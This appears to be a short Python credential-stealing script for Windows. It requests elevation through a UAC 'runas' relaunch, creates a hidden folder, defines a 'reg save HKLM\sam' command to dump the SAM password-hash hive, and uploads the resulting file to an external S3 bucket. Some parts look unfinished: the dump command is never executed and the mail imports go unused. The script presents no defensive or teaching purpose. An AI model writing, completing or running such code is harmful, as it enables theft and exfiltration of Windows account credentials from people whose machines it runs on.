import email
import smtplib
import os
import ctypes
import sys
import boto3
from dotenv import load_dotenv

#variables
folder_path = 'C:\\hashes'
cmd = 'reg save HKLM\sam ./hash.save '

s3 = boto3.client(
    's3',
    aws_access_key_id=os.getenv('AWS_ACCESS_KEY_ID'),
    aws_secret_access_key=os.getenv('AWS_SECRET_ACCESS_KEY')
)


def is_Admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False
    
if is_Admin():
    os.makedirs(folder_path, exist_ok=True)
    os.system(f'attrib +h {folder_path}')
else:
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, ' '.join(sys.argv), None, 1)

is_Admin()
s3.upload_file('hash.save', 'jajs-hash-bucket', 'hash.save')

